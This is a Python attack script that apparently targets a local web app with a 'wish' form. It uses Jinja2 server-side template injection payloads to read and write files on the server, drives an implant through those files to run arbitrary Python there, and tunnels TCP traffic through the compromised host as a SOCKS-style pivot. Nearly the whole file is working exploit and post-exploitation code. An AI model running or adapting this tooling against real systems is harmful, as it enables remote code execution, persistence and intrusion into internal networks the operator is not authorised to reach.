import base64
import time
import socket
import reprlib
import select
import zlib
import traceback
import hashlib

req = """\
GET / HTTP/1.1
Host: 127.0.0.1

""".replace(
    "\n", "\r\n"
).encode()


def base64_encode(content: bytes):
    return base64.b64encode(content).decode()


def base64_decode(content: str):
    return base64.b64decode(content)


class UnknownState(Exception):
    pass


class ReadFailed(Exception):
    pass


class VesselEval:
    def __init__(self, rw_func):
        self.rw = rw_func
        self.is_recv_func_injected = False
        self.is_hmac_eval_injected = False

    def _vessel_eval(self, cmd):
        self.rw("/tmp/vessel/c", cmd)
        self.rw("/tmp/vessel/s", "EVAL"+str(hash(time.time()))[-6:])
        while True:
            state = self.rw("/tmp/vessel/s")
            if state == "WAITING":
                break
            elif state[:4] == "EVAL":
                time.sleep(0.1)
                continue
            elif state == "":
                continue
            else:
                raise UnknownState(state)
        for _ in range(5):
            result = self.rw("/tmp/vessel/c")
            if result[:2] == "R:":
                break
        else:
            raise ReadFailed(result)
                
        return result[2:]

    def vessel_eval(self, cmd):
        while True:
            if not self.is_hmac_eval_injected:
                payload = "def hmac_eval(cmd, md5):return eval(cmd) if i('hashlib').md5(cmd.encode()).digest().hex()==md5 else '*HASH_NOT_MATCH'"
                self._vessel_eval("exec({})".format(repr(payload)))
                self.is_hmac_eval_injected=True
            "*HASH_NOT_MATCH"
            md5 = hashlib.md5(cmd.encode()).digest().hex()
            result = self._vessel_eval("hmac_eval({},{})".format(
                repr(cmd),
                repr(md5)
            ))
            if result != "*HASH_NOT_MATCH":
                return result
            print("Hash not match, sleep")
            time.sleep(1)

    def vessel_exec(self, cmd):
        self.vessel_eval("exec({},globals())".format(repr(cmd)))

    def socket_new(self):
        self.vessel_exec("s=i('socket').socket(2,1);")

    def socket_connect(self, host, port):
        assert isinstance(host, str) and isinstance(port, int)
        self.vessel_exec(f"s.connect(('{host}',{port}));")

    def socket_send(self, content):
        assert isinstance(content, bytes)
        content = zlib.compress(content)
        b = base64_encode(content)
        self.vessel_eval(f"s.send(z.decompress(b.b64decode('{b}')))")

    def socket_recv(self, num=1024):
        if not self.is_recv_func_injected:
            self.vessel_exec(
                f"def socket_recv(num): ss=i('select').select([s,], [], [], 0.001)[0];return b.b64encode(ss[0].recv(num)).decode() if ss else '*NOTHINGNEW'"
            )
            self.is_recv_func_injected = True
        # payload = f"b.b64encode(s.recv({num})).decode()"
        # payload = f"''.join(b.b64encode(s.recv({num})).decode() for s in i('select').select([s,], [], [], 0.1)[0])"
        payload = f"socket_recv({num})"
        result = self.vessel_eval(payload)
        if result == "*NOTHINGNEW":
            return None
        return base64_decode(result)

    def socket_close(self):
        self.vessel_exec("s.close();del s;i('gc').collect()")


class ForwardSocketProxy:
    def __init__(self, vessel, lhost, lport, rhost, rport):
        self.v = vessel
        self.lhost = lhost
        self.lport = lport
        self.rhost = rhost
        self.rport = rport

    def serve_client(self, client_socket):
        try:
            self.v.socket_new()
            self.v.socket_connect(self.rhost, self.rport)
        except UnknownState as e:
            print("[!] Unknown state: " + repr(e))
            client_socket.close()
            return
        sent_bytes = 0
        while True:
            to_remote = None
            try:
                toread, _, _ = select.select([client_socket], [], [], 0.001)
                if toread:
                    to_remote = client_socket.recv(1024*64)
            except Exception:
                traceback.print_exc()
                print("[.] closing...")
                self.v.socket_close()
                break
            if to_remote is None:
                pass
            elif to_remote == b"":
                print("[.] closing...")
                self.v.socket_close()
                break
            elif len(to_remote) < 1024*16:
                print("[.] {}+{}->o: {}".format(
                    sent_bytes,
                    len(to_remote),
                    reprlib.repr(to_remote)
                ))
                sent_bytes += len(to_remote)
                self.v.socket_send(to_remote)
            elif to_remote:
                print("[.] ->o/o/o")
                for i in range(0, len(to_remote), 1024*16):
                    print(
                        "[.] {}B+{}B ->o: {}".format(
                            sent_bytes,
                            len(to_remote[i : i + 1024*16]),
                            reprlib.repr(to_remote[i : i + 1024*16]),
                        )
                    )
                    sent_bytes += len(to_remote[i : i + 1024*16])
                    self.v.socket_send(to_remote[i : i + 1024*16])
            try:
                to_client = self.v.socket_recv()
            except Exception:
                traceback.print_exc()
                client_socket.close()
                break
            if to_client == b"":
                print("[.] closing...")
                client_socket.close()
                break
            if to_client is not None:
                print("[.] o<-: " + reprlib.repr(to_client))
                client_socket.sendall(to_client)

    def loop(self):
        while True:
            client_socket, addr = self.server_socket.accept()
            client_socket.settimeout(1)
            client_socket.setblocking(False)
            with client_socket:
                self.serve_client(client_socket)

    def serve(self):
        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        print(f"{self.lhost}:{self.lport} -> {self.rhost}:{self.rport}")
        self.server_socket.bind((self.lhost, self.lport))
        self.server_socket.listen(0)

        try:
            self.loop()
        except KeyboardInterrupt:
            pass
        self.server_socket.close()


def main():
    import requests
    import html
    def rw(file, content=None):
        if content:
            payload = f"{{{{lipsum.__globals__.__builtins__.open({repr(file)}, 'w').write({repr(content)})}}}}"
        else:
            payload = f"{{{{lipsum.__globals__.__builtins__.open({repr(file)}, 'r').read()}}}}"
        r = requests.post("http://127.0.0.1:10293/", data={
            "wish": payload
        })
        content = html.unescape(r.text)
        return content.partition("您的愿望")[2].partition("已许下")[0]
    server = ForwardSocketProxy(VesselEval(rw), "127.0.0.1", 1080, "127.0.0.1", 11080)
    server.serve()


if __name__ == "__main__":
    main()
